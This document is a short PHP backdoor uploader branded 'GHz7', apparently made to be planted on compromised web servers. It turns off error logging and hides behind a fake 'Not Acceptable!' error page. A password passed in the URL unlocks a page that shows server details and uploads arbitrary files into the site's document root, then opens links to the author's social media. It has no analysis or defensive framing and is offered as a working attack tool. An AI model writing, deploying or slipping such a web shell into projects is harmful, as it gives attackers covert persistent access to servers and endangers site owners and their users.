<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors',0);
$password = "ccd4ef469fef46735af58a97907f7f3b";
if(isset($_GET['q']) && (md5($_GET['q']) == $password)){
echo "<html><head><link rel='icon' type='image/png' href='https://www.redditstatic.com/icon.png' type='image/x-icon'><meta name='theme-color' content=' #000000'><title>GHz7</title></head>";
echo "<body><style type='text/css'>
body{background:url('http://www.baliforyou.com/assets/psycho.jpg');background-repeat:no-repeat;overflow:hidden;background-attachment: fixed;background-position:top center;font-family:Ubuntu;color:#fff;display:flex;align-items:center;justify-content:center;background-color:#000;}</style>";
echo "<center>".php_uname()."<br>&nbsp;<br>DIRNAME: ".dirname(__FILE__)."<br>&nbsp;<form method='post' enctype='multipart/form-data'><input type='file' name='lamer_file'><input type='submit' name='ghz7' value='>///<'></form></center></body></html>";
$root = $_SERVER['DOCUMENT_ROOT'];$files = $_FILES['lamer_file']['name'];$dest = $root.'/'.$files;if(isset($_POST['ghz7'])){if(is_writable($root)){
if(@copy($_FILES['lamer_file']['tmp_name'],$dest)){
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "
			<script type='text/javascript'>
			alert('succsessful uploaded file in $web$files');window.open('$web$files','_blank');window.open('https://instagram.com/zxmbxe_','_blank');</script>
			";}else{echo "
			<script type='text/javascript'>
			alert('upload failed in document root.');</script>
			";}}else{if(@copy($_FILES['lamer_file']['tmp_name'],$files)){echo "
			<script type='text/javascript'>
			alert('succsessful uploaded $files in this folder!.');</script>
			";}else{echo "
			<script type='text/javascript'>
			alert('failed to upload file.');window.open('https://easybanget.tech','_blank');</script>
			";}};}}
else{echo '
<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by GHz7</p></body></html>';}
?>